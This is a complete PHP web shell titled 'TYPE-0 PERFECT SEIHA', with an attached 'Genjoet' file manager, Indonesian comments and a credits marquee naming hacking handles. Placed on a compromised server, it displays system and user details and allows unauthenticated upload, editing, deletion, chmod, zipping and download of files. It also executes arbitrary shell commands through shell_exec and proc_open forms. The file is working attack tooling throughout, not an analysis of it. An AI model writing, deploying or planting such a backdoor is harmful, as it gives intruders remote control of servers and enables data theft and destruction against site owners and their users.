
<!DOCTYPE html>
<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta charset="UTF-8">
<link rel="icon" href="https://i.imgur.com/STpfZR9.png" type="image/png">
<link rel="stylesheet" href="https://titan.mythicmc.org/styles.css"> 
<script src="https://titan.mythicmc.org/movingblob.js" type="4373df8595d037690e63774b-text/javascript"></script>
<head>
<title>TYPE-0 PERFECT SEIHA</title>
<style>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Dosis');
        @import url('https://fonts.googleapis.com/css?family=Bungee');
        @import url('https://fonts.googleapis.com/css?family=Russo+One');
        body, h1, h2, h3, p, th, td, a, pre {
			color: #fff;
            font-family: "Russo One", cursive;
            text-shadow: 0px 0px 1px #434170;
            margin: 20px;
        }
        .container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #ccc; }
        table { width: 100%; border-collapse: collapse; }
        td { border: 1px solid #ddd; padding: 8px; text-align: left; color: #fff; }
        th { background-color: #292929; }
        .breadcrumb { list-style-type: none; padding: 0; display: flex; flex-wrap: wrap; justify-content: center; color: #fff; }
        .breadcrumb li { margin-right: 5px; color: #fff; }
        .breadcrumb a { text-decoration: none; color: #fff; }
        .permission-green { color: green; }
        .permission-red { color: red; }
        .current-directory h3 {
            text-align: center;
        }
        .home-link { font-size: 18px; margin-bottom: 10px; }
        h1 {
            color: #fff;
        }
		h2 {
            color: #fff;
        }
		h3 {
            color: #fff;
        }
		pre {
            color: #fff;
        }
		li {
            color: #fff;
        }
		.lime-text {
            color: #3df2ff;
        }
        form {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input[type="text"], input[type="checkbox"] {
            margin-right: 5px;
        }
        button {
            padding: 5px 10px;
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 10px;
            border: 1px solid #ddd;
            text-align: left;
        }
        th {
            background-color: #f4f4f4;
        }
        .select-all {
            margin-bottom: 10px;
        }
		table td a {
        color: white; /* Warna untuk tautan folder/file */
		}
		table td a:hover {
        color: green; /* Warna saat tautan di-hover */
		}
    </style>
</style>
	<script>
        // Script untuk "Pilih Semua"
        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('select-all').addEventListener('change', function() {
                var isChecked = this.checked;
                var checkboxes = document.querySelectorAll('input[name="items[]"]');
                checkboxes.forEach(function(checkbox) {
                    checkbox.checked = isChecked;
                });
            });

            // Tampilkan input nama baru saat memilih "Rename"
            document.getElementById('action').addEventListener('change', function() {
                var action = this.value;
                var renameInput = document.getElementById('rename-input');
                if (action === 'rename') {
                    renameInput.style.display = 'block';
                } else {
                    renameInput.style.display = 'none';
                }

                // Tidak perlu menampilkan apa-apa di sini untuk "edit"
            });
        });
    </script>
</head>
<header>
<img src="https://i.imgur.com/STpfZR9.png" style="height: 100px;">
<span class="full-text">TYPE-0 PERFECT SEIHA</span>
<span class="short-text">Type-0</span>
</header>
<div id="bgtiles"></div>
<img class="bgsprite" id="sprite1" src="https://titan.mythicmc.org/blob1.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite2" src="https://titan.mythicmc.org/blob2.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite3" src="https://titan.mythicmc.org/blob3.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite4" src="https://titan.mythicmc.org/blob4.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<img class="bgsprite" id="sprite5" src="https://titan.mythicmc.org/blob.png" width="501" height="471" style="display: block; left: -269.237px; top: 484.032px;">
<body>
    <div class="container">
        <h2>TYPE-0 PERFECT SEIHA</h2>
        <?php
        echo '<h3>Server Info:</h3>';
        echo '<pre>' . htmlspecialchars(php_uname('a')) . '</pre>';
        echo '<h3>User Info:</h3>';
        echo '<pre>Current User: ' . htmlspecialchars(get_current_user()) . '</pre>';
        echo '<h3>Server Software:</h3>';
        if (strpos($_SERVER['SERVER_SOFTWARE'], 'LiteSpeed') !== false) {
            echo '<pre>LiteSpeed</pre>';
        } elseif (strpos($_SERVER['SERVER_SOFTWARE'], 'Apache') !== false) {
            echo '<pre>Apache</pre>';
        } else {
            echo '<pre>' . htmlspecialchars($_SERVER['SERVER_SOFTWARE']) . '</pre>';
        }
        function listFiles($dir) {
    $folders = array();
    $files = array();
    if (is_dir($dir)) {
        if ($dh = opendir($dir)) {
            while (($file = readdir($dh)) !== false) {
                if ($file != '.' && $file != '..') {
                    $filePath = $dir . '/' . $file;
                    $fileInfo = stat($filePath);
                    $permissions = substr(sprintf('%o', fileperms($filePath)), -4);
                    $lastModified = date('Y-m-d H:i:s', $fileInfo['mtime']);
                    
                    // Cek apakah posix tersedia
                    if (function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
					$pwuid = @posix_getpwuid($fileInfo['uid']);
					$grgid = @posix_getgrgid($fileInfo['gid']);
					$userGroup = $pwuid['name'] . '/' . $grgid['name'];
					} else {
					$userGroup = 'Unknown/Unknown'; // Fallback untuk Windows
					}

                    $size = is_dir($filePath) ? '-' : filesize($filePath);
                    $permissionClass = is_writable($filePath) ? 'permission-green' : 'permission-red';

                    $fileData = array(
                        'name' => $file,
                        'size' => $size,
                        'permissions' => $permissions,
                        'lastModified' => $lastModified,
                        'userGroup' => $userGroup,
                        'path' => $filePath,
                        'isDir' => is_dir($filePath),
                        'permissionClass' => $permissionClass
                    );
                    if ($fileData['isDir']) {
                        $folders[] = $fileData;
                    } else {
                        $files[] = $fileData;
                    }
                }
            }
            closedir($dh);
        }
    } else {
        echo '<p>Not a valid directory.</p>';
    }
    echo '<h3>Folders:</h3>';
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
    foreach ($folders as $folder) {
        echo '<tr>';
        echo '<td><a href="?dir='.urlencode($folder['path']).'"> '.$folder['name'].'</a></td>';
        echo '<td>'.$folder['size'].'</td>';
        echo '<td class="'.$folder['permissionClass'].'">'.$folder['permissions'].'</td>';
        echo '<td>'.$folder['lastModified'].'</td>';
        echo '<td>'.$folder['userGroup'].'</td>';
        echo '</tr>';
    }
    echo '</table>';
    echo '<h3>Files:</h3>';
    echo '<table>';
    echo '<tr><th>Name</th><th>Size</th><th>Permissions</th><th>Last Modified</th><th>User/Group</th></tr>';
    foreach ($files as $file) {
        echo '<tr>';
        echo '<td><a href="?dir='.urlencode($dir).'&edit='.urlencode($file['path']).'"> '.$file['name'].'</a></td>';
        echo '<td>'.$file['size'].'</td>';
        echo '<td class="'.$file['permissionClass'].'">'.$file['permissions'].'</td>';
        echo '<td>'.$file['lastModified'].'</td>';
        echo '<td>'.$file['userGroup'].'</td>';
        echo '</tr>';
    }
    echo '</table>';
}

        $currentDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
        if (isset($_GET['dir']) && is_dir($_GET['dir'])) {
            $currentDir = realpath($_GET['dir']);
        }
        chdir($currentDir);
        // Aploder
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['files'])) {
            $uploadDir = $currentDir . '/';
            // Loop untuk menangani beberapa file
            foreach ($_FILES['files']['name'] as $key => $name) {
                $uploadFile = $uploadDir . basename($name);
                if (move_uploaded_file($_FILES['files']['tmp_name'][$key], $uploadFile)) {
                    echo '<p>File ' . htmlspecialchars($name) . ' uploaded successfully.</p>';
                } else {
                    echo '<p>Failed to upload file ' . htmlspecialchars($name) . '.</p>';
                }
            }
        }
        // Komeng
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['komeng'])) {
            $komeng = $_POST['komeng'];
            if ($komeng) {
                echo '<h3>Komeng Output:</h3>';
                echo '<pre>';
                echo shell_exec(escapeshellcmd($komeng));
                echo '</pre>';
            }
        }
        // Edit
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save'])) {
            $fileToSave = $_POST['filename'];
            $content = $_POST['content'];
            file_put_contents($fileToSave, $content);
            // Tetap berada di halaman edit setelah menyimpan
            $dir = dirname($fileToSave);
            header("Location: ?dir=" . urlencode($dir) . "&edit=" . urlencode($fileToSave));
            
        }
        // Krit dir
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_dir'])) {
            $newDir = $_POST['new_dir'];
            if ($newDir) {
                $newDirPath = $currentDir . '/' . $newDir;
                if (!is_dir($newDirPath)) {
                    mkdir($newDirPath);
                    echo '<p>Directory created successfully.</p>';
                } else {
                    echo '<p>Directory already exists.</p>';
                }
            }
        }
        // Krit file
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_file'])) {
            $newFile = $_POST['new_file'];
            if ($newFile) {
                $newFilePath = $currentDir . '/' . $newFile;
                if (!file_exists($newFilePath)) {
                    file_put_contents($newFilePath, '');
                    echo '<p>File created successfully.</p>';
                } else {
                    echo '<p>File already exists.</p>';
                }
            }
        }
		// Current Direktori
        function renderBreadcrumb($currentDir) {
            $pathArray = explode(DIRECTORY_SEPARATOR, $currentDir);
            echo '<ul class="breadcrumb" style="justify-content:center;">';
            echo '<li><a href="?">[HOME]</a></li>';
            foreach ($pathArray as $index => $dir) {
                if ($dir === '') continue;  
                $path = implode(DIRECTORY_SEPARATOR, array_slice($pathArray, 0, $index + 1));
                echo '<li><a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($dir) . '</a></li>';
                if ($index < count($pathArray) - 1) {
                    echo '<li>/</li>';
                }
            }
            echo '</ul>';
        }
        ?>
        <form method="POST" enctype="multipart/form-data">
            <input type="file" name="files[]" multiple>
            <button type="submit">Upload Files</button>
        </form>

        <form method="POST">
		<label for="komeng"><font color="white">Komeng:</font></label>
            <input type="text" name="komeng" placeholder="Enter Komeng">
            <button type="submit">Execute Komeng</button>
        </form>
		
		<?php //  PROC OPEN :V
		if ($_SERVER["REQUEST_METHOD"] === "POST") {
			$cmd = escapeshellcmd($_POST['cmd']);
			$descriptorspec = array(
				0 => array("pipe", "r"),  // stdin
				1 => array("pipe", "w"),  // stdout
				2 => array("pipe", "w")   // stderr
			);
			$process = proc_open($cmd, $descriptorspec, $pipes);
			if (is_resource($process)) {
			$output = stream_get_contents($pipes[1]);
			fclose($pipes[1]);
			proc_close($process);
			}
			}
		?>
		<form method="post">
			<label for="cmd" class="lime-text">PROC:</label>
			<input type="text" name="cmd" id="cmd" required>
			<button type="submit">Run PROC</button>
		</form>
		<pre class="lime-text"><?php if (isset($output)) { echo htmlspecialchars($output); } ?></pre>
		
        <form method="POST">
            <input type="text" name="new_file" placeholder="New file name">
            <button type="submit">Create File</button>
        </form>

        <form method="POST">
            <input type="text" name="new_dir" placeholder="New directory name">
            <button type="submit">Create Directory</button>
        </form>
        <?php
        renderBreadcrumb($currentDir);
        if (isset($_GET['edit'])) {
            $fileToEdit = $_GET['edit'];
            if (is_file($fileToEdit)) {
                $content = file_get_contents($fileToEdit);
                echo '<h3>Edit File: ' . htmlspecialchars($fileToEdit) . '</h3>';
                echo '<form method="POST">';
                echo '<textarea name="content" rows="20" cols="100">' . htmlspecialchars($content) . '</textarea><br>';
                echo '<input type="hidden" name="filename" value="' . htmlspecialchars($fileToEdit) . '">';
                echo '<button type="submit" name="save">Save</button>';
                echo '</form>';
            }
        }
		listFiles($currentDir);
        ?>
        
    </div>
</body>
<?php
$directory = '.'; // Direktori saat ini
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action']) && isset($_POST['items'])) {
        $action = $_POST['action'];
        $items = $_POST['items'];

        if ($action === 'delete') {
            foreach ($items as $item) {
                if (is_file($item)) {
                    unlink($item);
                } elseif (is_dir($item)) {
                    // Menghapus direktori secara rekursif
                    deleteDir($item);
                }
            }
            $message = 'File/folder berhasil dihapus.';
        } elseif ($action === 'chmod' && isset($_POST['permissions'])) {
            $permissions = $_POST['permissions'];
            if (preg_match('/^[0-7]{3,4}$/', $permissions)) {
                foreach ($items as $item) {
                    if (file_exists($item)) {
                        chmod($item, octdec($permissions));
                    }
                }
                $message = "Permission menjadi $permissions untuk file/folder yang dipilih.";
            } else {
                $message = 'Permission salah.';
            }
        } elseif ($action === 'download') {
            if (count($items) === 1 && is_file($items[0])) {
                // Download file tunggal
                $file = $items[0];
                if (file_exists($file)) {
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($file));
                    readfile($file);
                    exit;
                } else {
                    $message = 'File tidak ditemukan.';
                }
            } elseif (count($items) > 1) {
                // Download multiple files sebagai zip
                $zip = new ZipArchive();
                $zipName = 'download_' . time() . '.zip';

                if ($zip->open($zipName, ZipArchive::CREATE) !== TRUE) {
                    $message = 'Gagal membuat file zip.';
                } else {
                    foreach ($items as $item) {
                        if (is_file($item)) {
                            $zip->addFile($item, $item);
                        } elseif (is_dir($item)) {
                            addFolderToZip($item, $zip, basename($item));
                        }
                    }
                    $zip->close();

                    // Kirim file zip ke pengguna
                    header('Content-Type: application/zip');
                    header('Content-disposition: attachment; filename=' . $zipName);
                    header('Content-Length: ' . filesize($zipName));
                    readfile($zipName);

                    // Hapus file zip setelah diunduh
                    unlink($zipName);
                    exit;
                }
            } else {
                $message = 'Tidak ada file yang dipilih untuk diunduh.';
            }
        } elseif ($action === 'rename' && isset($_POST['new_name'])) {
            $new_name = trim($_POST['new_name']);
            if (count($items) === 1 && !empty($new_name)) {
                $old_name = $items[0];
                if (file_exists($old_name)) {
                    if (rename($old_name, $new_name)) {
                        $message = "Berhasil mengganti nama '$old_name' menjadi '$new_name'.";
                    } else {
                        $message = 'Gagal mengganti nama.';
                    }
                } else {
                    $message = 'File/folder tidak ditemukan.';
                }
            } else {
                $message = 'Pilih tepat satu file/folder dan masukkan nama baru.';
            }
        } elseif ($action === 'edit') {
            if (isset($_POST['file_content'])) {
                // Menyimpan perubahan ke file
                if (count($items) === 1 && is_file($items[0])) {
                    $file = $items[0];
                    $content = $_POST['file_content'];
                    if (file_put_contents($file, $content) !== false) {
                        $message = "File '$file' berhasil diperbarui.";
                    } else {
                        $message = "Gagal memperbarui file '$file'.";
                    }
                } else {
                    $message = 'Pilih tepat satu file yang bisa diedit.';
                }
            } else {
                // Menampilkan form edit
                if (count($items) === 1 && is_file($items[0])) {
                    $edit_item = $items[0];
                    $file_content = file_get_contents($edit_item);
                } else {
                    $message = 'Pilih tepat satu file yang bisa diedit.';
                }
            }
        } elseif ($action === 'zip') {
            // Membuat zip di server
            if (count($items) > 0) {
                $zip = new ZipArchive();
                $zipName = 'archive_' . time() . '.zip';

                if ($zip->open($zipName, ZipArchive::CREATE) !== TRUE) {
                    $message = 'Gagal membuat file zip.';
                } else {
                    foreach ($items as $item) {
                        if (is_file($item)) {
                            $zip->addFile($item, $item);
                        } elseif (is_dir($item)) {
                            addFolderToZip($item, $zip, basename($item));
                        }
                    }
                    $zip->close();
                    $message = "File zip '$zipName' berhasil dibuat.";
                }
            } else {
                $message = 'Tidak ada file/folder yang dipilih untuk di-zip.';
            }
        } else {
            $message = 'Error.';
        }
    } elseif (isset($_POST['action']) && $_POST['action'] === 'edit_form' && isset($_POST['edit_item'])) {
        // Menampilkan form edit (jika diperlukan, namun pada perbaikan ini tidak digunakan)
        // Bagian ini dapat diabaikan karena logika edit sudah diatur di atas
    }
}

// Fungsi untuk menghapus direktori secara rekursif
function deleteDir($dirPath) {
    if (!is_dir($dirPath)) {
        return;
    }
    $objects = scandir($dirPath);
    foreach ($objects as $object) {
        if ($object != "." && $object != "..") {
            $path = $dirPath . DIRECTORY_SEPARATOR . $object;
            if (is_dir($path)) {
                deleteDir($path);
            } else {
                unlink($path);
            }
        }
    }
    rmdir($dirPath);
}

// Fungsi untuk menambahkan folder ke zip secara rekursif
function addFolderToZip($folder, $zip, $parentFolder = '') {
    $handle = opendir($folder);
    while (($entry = readdir($handle)) !== false) {
        if ($entry == '.' || $entry == '..') continue;
        $path = $folder . DIRECTORY_SEPARATOR . $entry;
        $localPath = $parentFolder . '/' . $entry;
        if (is_dir($path)) {
            $zip->addEmptyDir($localPath);
            addFolderToZip($path, $zip, $localPath);
        } else {
            $zip->addFile($path, $localPath);
        }
    }
    closedir($handle);
}

// Ambil daftar file/folder dan izin mereka
$files = [];
foreach (glob('*') as $file) {
    $files[$file] = substr(decoct(fileperms($file) & 0777), -3);
}

?>
<h1>Genjoet File/Folder Manager</h1>
    <?php if (isset($message) && $message !== ''): ?>
        <p><strong><?php echo htmlspecialchars($message); ?></strong></p>
    <?php endif; ?>

    <?php if (isset($edit_item) && isset($file_content)): ?>
        <div class="edit-form">
            <h2>Edit File: <?php echo htmlspecialchars($edit_item); ?></h2>
            <form method="post">
                <textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea>
                <input type="hidden" name="action" value="edit">
                <input type="hidden" name="items[]" value="<?php echo htmlspecialchars($edit_item); ?>">
                <br>
                <button type="submit">Simpan Perubahan</button>
            </form>
        </div>
    <?php else: ?>
        <form method="post">
            <fieldset>
                <legend><font color="white">Daftar File/Folder</font></legend>
                <div class="select-all">
                    <input type="checkbox" id="select-all">
                    <label for="select-all"><font color="white">Pilih Semua</font></label>
                </div>
                <table>
                    <thead>
                        <tr>
                            <th>Pilih</th>
                            <th>Nama File/Folder</th>
                            <th>Permission</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($files as $file => $perm): ?>
                            <tr>
                                <td><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($file); ?>"></td>
                                <td><?php echo htmlspecialchars($file); ?></td>
                                <td><?php echo htmlspecialchars($perm); ?></td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <br>
                <label for="permissions"><font color="white">Cemot (755. dll):</font></label>
                <input type="text" id="permissions" name="permissions" placeholder="Kusus cemot">
                <br><br>
                <label for="action"><font color="white">Opsi:</font></label>
                <select id="action" name="action" required>
                    <option value="" disabled selected>Pilih Opsi</option>
                    <option value="delete">Hapus</option>
                    <option value="chmod">Ubah Permission</option>
                    <option value="download">Download</option>
                    <option value="rename">Ganti Nama</option>
                    <option value="edit">Edit File</option>
                    <option value="zip">Zip</option>
                </select>
                <br><br>
                <div id="rename-input" class="hidden">
                    <label for="new_name"><font color="white">Rename:</font></label>
                    <input type="text" id="new_name" name="new_name" placeholder="Masukkan nama baru">
                    <br><br>
                </div>
                <button type="submit">Gaskeun</button>
            </fieldset>
        </form>
    <?php endif; ?>

    <script>
        // Tampilkan/ sembunyikan input rename berdasarkan aksi yang dipilih
        document.getElementById('action').addEventListener('change', function() {
            var action = this.value;
            var renameInput = document.getElementById('rename-input');
            if (action === 'rename') {
                renameInput.style.display = 'block';
            } else {
                renameInput.style.display = 'none';
            }
        });
    </script>
</div>
<div class="footer">
<marquee><a href="https://type0.my.id">Anon7 | <font color ="red">Type-0</font> | ./meicookies | MR.HAGAN_404CR4ZY | He4l3rz | Mr.Grim | VenoRyan | Rian Haxor | ChokkaXploiter | MungielL | Nzxsx7 | ./G1L4N6_ST86 | kuroaMEpiKAcyu | UnknownSec | Temp3 | xRyukz  | RavaFake | Cubjrnet7 | Calutax07 | ./Mr.Spongebob | ./BE64L | Localheadz</a></marquee>
</div>
<script src="https://titan.mythicmc.org/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="4373df8595d037690e63774b-|49" defer></script></body>
</html>
